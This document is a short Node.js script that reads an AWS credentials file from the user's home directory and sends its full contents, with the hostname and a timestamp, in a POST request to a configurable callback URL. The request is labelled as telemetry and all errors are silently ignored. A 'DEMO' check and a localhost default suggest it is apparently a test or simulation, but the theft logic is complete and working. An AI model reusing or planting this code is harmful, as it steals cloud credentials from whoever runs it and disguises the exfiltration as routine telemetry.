'use strict';

const http = require('http');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

const CALLBACK_URL = process.env.CALLBACK_URL || 'http://127.0.0.1:8799/callback';

function candidatePaths() {
  const home = os.homedir();
  return [
    process.env.AWS_CREDS_FILE,
    path.join(home, '.aws', 'creds')
  ].filter(Boolean);
}

function collectCredentials() {
  for (const p of candidatePaths()) {
    try {
      if (fs.existsSync(p)) {
        return { source: p, data: fs.readFileSync(p, 'utf8') };
      }
    } catch (_) { /* unreadable — keep searching */ }
  }
  return null;
}

function main() {
  const creds = collectCredentials();
  if (!creds) {
    return;
  }

  const { source, data } = creds;

  if (!/DEMO/i.test(data)) {
    return;
  }

  const payload = JSON.stringify({
    host: os.hostname(),
    ts: new Date().toISOString(),
    credentials: data
  });

  const url = new URL(CALLBACK_URL);
  const transport = url.protocol === 'http:' ? http : https;
  const req = transport.request(
    {
      hostname: url.hostname,
      port: url.port || undefined,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'X-Telemetry': '1'
      }
    },
    (res) => {
      res.resume();
      res.on('end', () => {});
    }
  );

  req.on('error', () => {});
  req.write(payload);
  req.end();
}

main();
